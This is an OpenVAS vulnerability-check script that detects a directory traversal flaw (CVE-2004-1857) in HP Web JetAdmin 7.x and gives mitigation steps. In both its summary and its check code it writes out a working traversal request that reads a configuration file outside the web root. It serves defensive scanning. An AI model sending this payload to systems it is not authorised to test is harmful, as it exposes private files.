# OpenVAS Vulnerability Test
# $Id: hp_jadm_vuln.nasl 5390 2017-02-21 18:39:27Z mime $
# Description: HP Jet Admin 7.x Directory Traversal
#
# Authors:
# wirepair
#
# Copyright:
# Copyright (C) 2004 wirepair
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Tested only on HP Web JetAdmin Version 7.5.2546 checks a file just outside 
# of web root. I didn't want it to check for boot.ini incase its installed on 
# a separate drive then we'll get a false positive... -wirepair

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12120");
  script_version("$Revision: 5390 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1857");
  script_bugtraq_id(9973);
  script_tag(name:"cvss_base", value:"2.1");
  script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:P/I:N/A:N");
  script_xref(name:"IAVA", value:"2004-B-0007"); 
  script_name("HP Jet Admin 7.x Directory Traversal");
  script_summary("HP JetAdmin directory traversal attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 wirepair");
  script_family("General");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Jetadmin/banner");
  script_require_ports("Services/www", 8443);

  script_tag(name : "solution" , value : "To set a password for the HP Web Jet Admin service follow these steps:
  1. In the navigation menu select General Settings, and expand the tree.
  2. Expand Profiles Administration
  3. Select Add/Remove Profiles
  4. In the User Profiles page, if a password has not been set, select the 
  'Note: To enable security features, an Admin password must be set.' link.
  5. Set an administrator password.

  It is strongly recommended that access be restricted by IP Addresses:
  1. Expand the General Settings tree.
  2. Select the HTTP (Web) branch.
  3. Under the 'Allow HP Web Jetadmin Access' add your administration IP host or 
  range.  HP Also recommends removing all files that are included in the test 
  directory. On a default installation this would be in the directory
  C:\Program Files\HP Web Jetadmin\doc\plugins\hpjdwm\script\");
  script_tag(name : "summary" , value : "The remote HP Web JetAdmin suffers from a number of vulnerabilities. The 
  current running version is vulnerable to a directory traversal attack via i
  he setinfo.hts script. A remote attacker can access files by requesting the 
  following string:

  /plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini");

  script_xref(name : "URL" , value : "http://sh0dan.org/files/hpjadmadv.txt");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name : "solution_type", value : "Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

# Check starts here

debug = 0;

port = get_http_port(default:8443);
banner = get_http_banner(port:port);
if ( "HP Web Jetadmin/" >!< banner ) exit(0);


req = http_get(item:"/plugins/hpjdwm/script/test/setinfo.hts?setinclude=../../../../../hptrace.ini", port:port);

retval = http_keepalive_send_recv(port:port, data:req);
if(retval == NULL) exit(0);
if((retval =~ "HTTP/1.[01] 200") && ("Server: HP Web Jetadmin/" >< retval)) 
{
    retval = http_keepalive_send_recv(port:port, data:req);
    if("traceLogfile=" >< retval)
    {
        security_message(port:port);
        exit(0);
    }
}

exit(99);
